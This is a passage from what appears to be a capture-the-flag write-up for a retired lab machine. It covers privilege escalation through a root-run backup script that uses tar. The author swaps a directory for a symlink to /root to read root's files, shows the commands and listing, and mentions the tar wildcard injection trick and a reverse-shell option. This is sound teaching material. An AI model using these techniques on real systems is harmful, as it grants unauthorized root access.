@@ -90,5 +90,37 @@ user.txt  work
 ```
 
 Next to root:
+The root part took a while for me, mostly because I read a hint in the forum about setuid's and was waisting a lot of time searching for nothing. I spend a lot of time trying to find a special setuid files, which were not present (except from the basic files which are not exploitable).
+Now, because the machine is depricated, I will sum up the priv escalation quickly - we have a script called backup.sh which runs every x mins. One can see it by inspecting ps -aux or using a tool like pspy64. Opening the file revelas the following:
+```
+cat /usr/bin/backup.sh
+#!/bin/bash
+cd /home/giovanni/work;
+tar -czvf tmp/backup_courses.tar.gz courses/*;
+cd tmp;
+tar -xf backup_courses.tar.gz;
+chmod 777 * -R;
+```
+Straight away we notice that a tar archive is compressed form courses/* and decompressed in /home/giovanni/work. We can exploit a know tar weakness with wildcards (\*), you can read more here: https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
 
+Now, all we need to do is go into courses and set our arguments as files. You can run a shell.sh files that will connect back to your computer, but I just wanted to get the root.txt, so I created a symlink to root from courses, so when the tar will be compressed, accessing courses will read root's folder contents:
+```
+giovanni@teacher:~/work$ ln -s /root/ courses
+giovanni@teacher:~/work$ ls -la
+ls -la
+total 16
+drwxr-xr-x 4 giovanni giovanni 4096 Apr 18 15:29 .
+drwxr-x--- 4 giovanni giovanni 4096 Nov  4 19:47 ..
+lrwxrwxrwx 1 giovanni giovanni    6 Apr 18 15:29 courses -> /root/
+drwxr-xr-x 3 giovanni giovanni 4096 Apr 18 15:27 courses.bak
+drwxr-xr-x 3 giovanni giovanni 4096 Jun 27  2018 tmp
+-rw-rw-rw- 1 giovanni giovanni    0 Apr 18 15:20 ts
+```
+Great, now all we need to do is to extract the newly created tar file in work folder and read root.txt:
+```
+giovanni@teacher:~/work/tmp/courses$ cat root.txt
+cat root.txt
+4f3a83b42ac7723a508b8ace7b8b1209
+```
+That's it. Great machine!
 
